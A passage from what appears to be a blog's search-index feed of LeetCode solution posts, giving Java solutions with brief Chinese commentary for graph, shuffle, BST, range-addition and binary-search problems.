class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">double</span>[] calcEquation(String[][] equations, <span class="keyword">double</span>[] values, String[][] queries) &#123;</span><br><span class="line">    <span class="keyword">if</span> (equations == <span class="keyword">null</span> || values == <span class="keyword">null</span> || queries == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">double</span>[]&#123;&#125;;</span><br><span class="line">    <span class="comment">// construct graph</span></span><br><span class="line">    Map&lt;String, Map&lt;String, Double&gt;&gt; graph = <span class="keyword">new</span> HashMap&lt;&gt;(); <span class="comment">// graph</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; equations.length; i++) &#123;</span><br><span class="line">        String v = equations[i][<span class="number">0</span>], w = equations[i][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (!graph.containsKey(v)) graph.put(v, <span class="keyword">new</span> HashMap&lt;&gt;());</span><br><span class="line">        <span class="keyword">if</span> (!graph.containsKey(w)) graph.put(w, <span class="keyword">new</span> HashMap&lt;&gt;());</span><br><span class="line">        graph.get(v).put(w, values[i]);</span><br><span class="line">        graph.get(w).put(v, <span class="number">1.0</span>/values[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    Set&lt;String&gt; mark = <span class="keyword">new</span> HashSet&lt;&gt;();;</span><br><span class="line">    Map&lt;String, Double&gt; distTo = <span class="keyword">new</span> HashMap&lt;&gt;();;</span><br><span class="line">    <span class="keyword">double</span>[] res = <span class="keyword">new</span> <span class="keyword">double</span>[queries.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; queries.length; i++) &#123;</span><br><span class="line">        String v = queries[i][<span class="number">0</span>], w = queries[i][<span class="number">1</span>];</span><br><span class="line">        <span class="comment">// invalid query</span></span><br><span class="line">        <span class="keyword">if</span> (!graph.containsKey(v) || !graph.containsKey(w)) &#123;</span><br><span class="line">            res[i] = -<span class="number">1.0</span>;  <span class="keyword">continue</span>; &#125;</span><br><span class="line">        <span class="comment">// clear dfs result</span></span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123; distTo.clear(); mark.clear();&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// start dfs</span></span><br><span class="line">        distTo.put(v, <span class="number">1.0</span>);</span><br><span class="line">        dfs(graph, mark, distTo, v);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// check result</span></span><br><span class="line">        <span class="keyword">if</span> (!mark.contains(w)) res[i] = -<span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">else</span> res[i] = distTo.get(w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(Map&lt;String, Map&lt;String, Double&gt;&gt; graph, Set&lt;String&gt; mark,</span></span></span><br><span class="line"><span class="function"><span class="params">                 Map&lt;String, Double&gt; distTo, String v)</span> </span>&#123;</span><br><span class="line">    mark.add(v);</span><br><span class="line">    <span class="keyword">for</span> (String w: graph.get(v).keySet()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!mark.contains(w)) &#123;</span><br><span class="line">            distTo.put(w, distTo.get(v)*graph.get(v).get(w));</span><br><span class="line">            dfs(graph, mark, distTo, w);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Graph </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[384. Shuffle an Array]]></title>
      <url>/wiki/2017/10/30/Leetcode-384-Shuffle-an-Array/</url>
      <content type="html"><![CDATA[<p>Shuffle a set of numbers without duplicates.</p>
<p>Example:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Init an array with set 1, 2, and 3.</span></span><br><span class="line"><span class="keyword">int</span>[] nums = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">Solution solution = <span class="keyword">new</span> Solution(nums);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Shuffle the array [1,2,3] and return its result. Any permutation of [1,2,3] must equally likely to be returned.</span></span><br><span class="line">solution.shuffle();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Resets the array back to its original configuration [1,2,3].</span></span><br><span class="line">solution.reset();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Returns the random shuffling of array [1,2,3].</span></span><br><span class="line">solution.shuffle();</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>非常简单。既然要shuffle，肯定想到的是Knuth shuffle，然后题目里说还有个reset功能，那就要保留原来的数组。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q384ShuffleAnArray</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] array;</span><br><span class="line">    <span class="keyword">private</span> Random random;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Q384ShuffleAnArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.array = nums;</span><br><span class="line">        random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Resets the array to its original configuration and return it. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] reset() &#123;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Returns a random shuffling of the array. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] shuffle() &#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = <span class="keyword">this</span>.array.clone();</span><br><span class="line">        <span class="keyword">int</span> r, temp;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="comment">//In iteration i, pick integer r between 0 and i uniformly at random.</span></span><br><span class="line">            r = random.nextInt(i+<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// Swap a[i] and a[r].</span></span><br><span class="line">            temp = nums[i];</span><br><span class="line">            nums[i] = nums[r];</span><br><span class="line">            nums[r] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Sort </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[841. Keys and Rooms]]></title>
      <url>/wiki/2017/10/30/Leetcode-841-Keys-and-Rooms/</url>
      <content type="html"><![CDATA[<p>There are $N$ rooms and you start in room 0.  Each room has a distinct number in $0, 1, 2, …, N-1$, and each room may have some keys to access the next room. </p>
<p>Formally, each room $i$ has a list of keys rooms$[i]$, and each key rooms$[i][j]$ is an integer in $[0, 1, …, N-1]$ where $N$ = rooms.length.  A key rooms$[i][j] = v$ opens the room with number $v$.</p>
<p>Initially, all the rooms start locked (except for room 0). </p>
<p>You can walk back and forth between rooms freely.</p>
<p>Return true if and only if you can enter every room.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1],[2],[3],[]]</span><br><span class="line">Output: true</span><br><span class="line">Explanation:  </span><br><span class="line">We start in room 0, and pick up key 1.</span><br><span class="line">We then go to room 1, and pick up key 2.</span><br><span class="line">We then go to room 2, and pick up key 3.</span><br><span class="line">We then go to room 3.  Since we were able to go to every room, we return true.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,3],[3,0,1],[2],[0]]</span><br><span class="line">Output: false</span><br><span class="line">Explanation: We can&apos;t enter the room with number 2.</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>1 &lt;= rooms.length &lt;= 1000</li>
<li>0 &lt;= rooms$[i]$.length &lt;= 1000</li>
<li>The number of keys in all rooms combined is at most 3000.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>DFS的直接应用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canVisitAllRooms</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; rooms)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = rooms.size();</span><br><span class="line">    <span class="keyword">boolean</span>[] marked = <span class="keyword">new</span> <span class="keyword">boolean</span>[n];</span><br><span class="line">    dfs(rooms, marked, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="keyword">if</span> (!marked[i]) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; rooms, <span class="keyword">boolean</span>[] marked, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    marked[v] = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> w : rooms.get(v))</span><br><span class="line">        <span class="keyword">if</span> (!marked[w]) dfs(rooms, marked, w);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Depth-first Search </tag>
            
            <tag> Graph </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[785. Is Graph Bipartite?]]></title>
      <url>/wiki/2017/10/30/Leetcode-785-Is-Graph-Bipartite/</url>
      <content type="html"><![CDATA[<p>Given an undirected <code>graph</code>, return <code>true</code> if and only if it is bipartite.</p>
<p>Recall that a graph is <em>bipartite</em> if we can split it’s set of nodes into two independent subsets A and B such that every edge in the graph has one node in A and another node in B.</p>
<p>The graph is given in the following form: <code>graph[i]</code> is a list of indexes $j$ for which the edge between nodes $i$ and $j$ exists.  Each node is an integer between 0 and graph.length - 1.  There are no self edges or parallel edges: <code>graph[i]</code> does not contain $i$, and it doesn’t contain any element twice.</p>
<p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,3], [0,2], [1,3], [0,2]]</span><br><span class="line">Output: true</span><br><span class="line">Explanation: </span><br><span class="line">The graph looks like this:</span><br><span class="line">0----1</span><br><span class="line">|    |</span><br><span class="line">|    |</span><br><span class="line">3----2</span><br><span class="line">We can divide the vertices into two groups: &#123;0, 2&#125; and &#123;1, 3&#125;.</span><br></pre></td></tr></table></figure></p>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,2,3], [0,2], [0,1,3], [0,2]]</span><br><span class="line">Output: false</span><br><span class="line">Explanation: </span><br><span class="line">The graph looks like this:</span><br><span class="line">0----1</span><br><span class="line">| \  |</span><br><span class="line">|  \ |</span><br><span class="line">3----2</span><br><span class="line">We cannot find a way to divide the set of nodes into two independent subsets.</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>graph will have length in range [1, 100].</li>
<li><code>graph[i]</code> will contain integers in range [0, graph.length - 1].</li>
<li><code>graph[i]</code> will not contain $i$ or duplicate values.</li>
<li>The graph is undirected: if any element $j$ is in <code>graph[i]</code>, then $i$ will be in <code>graph[j]</code>.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>判断二分图。详细分析和解答在<a href="http://larryim.cc/note-os/algorithm/algorithmPrinceton/graph/#bipartite-graph">Algorithms 4th</a>这本书中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> bipartitable;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isBipartite</span><span class="params">(<span class="keyword">int</span>[][] graph)</span> </span>&#123;</span><br><span class="line">    bipartitable = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">boolean</span>[] marked = <span class="keyword">new</span> <span class="keyword">boolean</span>[graph.length];</span><br><span class="line">    <span class="keyword">boolean</span>[] color  = <span class="keyword">new</span> <span class="keyword">boolean</span>[graph.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> v = <span class="number">0</span>; v &lt; graph.length; v++)</span><br><span class="line">        <span class="keyword">if</span> (bipartitable &amp;&amp; !marked[v])</span><br><span class="line">            dfs(graph, color, marked, v);</span><br><span class="line">    <span class="keyword">return</span> bipartitable;   </span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span>[][] graph, <span class="keyword">boolean</span>[] color, <span class="keyword">boolean</span>[] marked, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    marked[v] = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> w : graph[v])&#123;</span><br><span class="line">        <span class="keyword">if</span> (!bipartitable) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!marked[w]) &#123;</span><br><span class="line">            color[w] = !color[v];</span><br><span class="line">            dfs(graph, color, marked, w);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (color[w] == color[v]) bipartitable = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Depth-first Search </tag>
            
            <tag> Breath-first Search </tag>
            
            <tag> Graph </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[783. Minimum Distance Between BST Nodes]]></title>
      <url>/wiki/2017/10/30/Leetcode-783-Minimum-Distance-Between-BST-Nodes/</url>
      <content type="html"><![CDATA[<p>Given a Binary Search Tree (BST) with the root node <code>root</code>, return the minimum difference between the values of any two different nodes in the tree.</p>
<p>Example :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Input: root = [4,2,6,1,3,null,null]</span><br><span class="line">Output: 1</span><br><span class="line">Explanation:</span><br><span class="line">Note that root is a TreeNode object, not an array.</span><br><span class="line"></span><br><span class="line">The given tree [4,2,6,1,3,null,null] is represented by the following diagram:</span><br><span class="line"></span><br><span class="line">          4</span><br><span class="line">        /   \</span><br><span class="line">      2      6</span><br><span class="line">     / \    </span><br><span class="line">    1   3  </span><br><span class="line"></span><br><span class="line">while the minimum difference in this tree is 1, it occurs between node 1 and node 2, also between node 3 and node 2.</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>The size of the BST will be between 2 and 100.</li>
<li>The BST is always valid, each node’s value is an integer, and each node’s value is different.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目其实考察的是二叉树的中序遍历，二叉树的中序遍历是一个递增序列，好像是错的。。。。。但是通过了AC。</p>
<p>待续。。。。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDiffInBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    TreeNode cur = root;</span><br><span class="line">    <span class="keyword">int</span> prev = <span class="number">0</span>, min = Integer.MAX_VALUE, count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="keyword">null</span> || !stack.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.left;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = stack.pop();</span><br><span class="line">        <span class="keyword">if</span> (count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> diff =  cur.val - prev;</span><br><span class="line">            <span class="keyword">if</span> (diff &lt; min) min = diff;</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">        prev = cur.val;</span><br><span class="line">        cur = cur.right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> min;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Binary Search Tree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[372. Super Pow]]></title>
      <url>/wiki/2017/10/30/Leetcode-372-Super-Pow/</url>
      <content type="html"><![CDATA[<p>Your task is to calculate $a^b$ mod 1337 where $a$ is a positive integer and $b$ is an extremely large positive integer given in the form of an array.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: a = 2, b = [3]</span><br><span class="line">Output: 8</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: a = 2, b = [1,0]</span><br><span class="line">Output: 1024</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[370. Range Addition]]></title>
      <url>/wiki/2017/10/30/Leetcode-370-Range-Addition/</url>
      <content type="html"><![CDATA[<p>Assume you have an array of length $n$ initialized with all 0’s and are given $k$ update operations.</p>
<p>Each operation is represented as a triplet: <code>[startIndex, endIndex, inc]</code> which increments each element of subarray <code>A[startIndex ... endIndex]</code> (startIndex and endIndex inclusive) with inc.</p>
<p>Return the modified array after all $k$ operations were executed.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Given:</span><br><span class="line">    length = 5,</span><br><span class="line">    updates = [</span><br><span class="line">        [1,  3,  2],</span><br><span class="line">        [2,  4,  3],</span><br><span class="line">        [0,  2, -2]</span><br><span class="line">    ]</span><br><span class="line">Output:</span><br><span class="line">    [-2, 0, 3, 5, 3]</span><br><span class="line">Explanation:</span><br><span class="line">    Initial state:</span><br><span class="line">    [ 0, 0, 0, 0, 0 ]</span><br><span class="line">    After applying operation [1, 3, 2]:</span><br><span class="line">    [ 0, 2, 2, 2, 0 ]</span><br><span class="line">    After applying operation [2, 4, 3]:</span><br><span class="line">    [ 0, 2, 5, 5, 3 ]</span><br><span class="line">    After applying operation [0, 2, -2]:</span><br><span class="line">    [-2, 0, 3, 5, 3 ]</span><br></pre></td></tr></table></figure>
<p>Hint:</p>
<ul>
<li>Thinking of using advanced data structures? You are thinking it too complicated.</li>
<li>For each update operation, do you really need to update all elements between $i$ and $j$?</li>
<li>Update only the first and end element is sufficient.</li>
<li>The optimal time complexity is $O(k + n)$ and uses $O(1)$ extra space.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p><a href="https://www.lintcode.com/problem/range-addition/description/">LintCode</a>链接。暴力法：每次更新[startIndex, endIndex]区间</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] getModifiedArray(<span class="keyword">int</span> length, <span class="keyword">int</span>[][] updates) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; updates.length; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = updates[i][<span class="number">0</span>]; j &lt;= updates[i][<span class="number">1</span>]; j++)</span><br><span class="line">            res[j] += updates[i][<span class="number">2</span>];</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比较巧妙的方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] getModifiedArray(<span class="keyword">int</span> length, <span class="keyword">int</span>[][] updates) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[length + <span class="number">1</span>], res = <span class="keyword">new</span> <span class="keyword">int</span>[length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span>[] update : updates) &#123;</span><br><span class="line">        arr[update[<span class="number">0</span>]] += update[<span class="number">2</span>];</span><br><span class="line">        arr[update[<span class="number">1</span>] + <span class="number">1</span>] -= update[<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    res[<span class="number">0</span>] = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; length; i++)</span><br><span class="line">        res[i] = res[i - <span class="number">1</span>] + arr[i];</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[367. Valid Perfect Square]]></title>
      <url>/wiki/2017/10/30/Leetcode-367-Valid-Perfect-Square/</url>
      <content type="html"><![CDATA[<p>Given a positive integer num, write a function which returns True if num is a perfect square else False.</p>
<p>Note: Do not use any built-in library function such as <code>sqrt</code>.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 16</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 14</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目与69. Sqrt(x)非常相像，只不过，Q69返回的是平方根值，这里返回的是是否是完全平方数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPerfectSquare</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lo = <span class="number">0</span>, hi = num;</span><br><span class="line">    <span class="keyword">while</span> (lo &lt;= hi) &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (lo + hi) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">double</span> cmp = ((<span class="keyword">double</span>) mid)*mid - num;</span><br><span class="line">        <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>) hi = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>)  lo = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[366. Find Leaves of Binary Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-366-Find-Leaves-of-Binary-Tree/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, collect a tree’s nodes as if you were doing this: Collect and remove all leaves, repeat until the tree is empty.</p>
<p>Example</p>
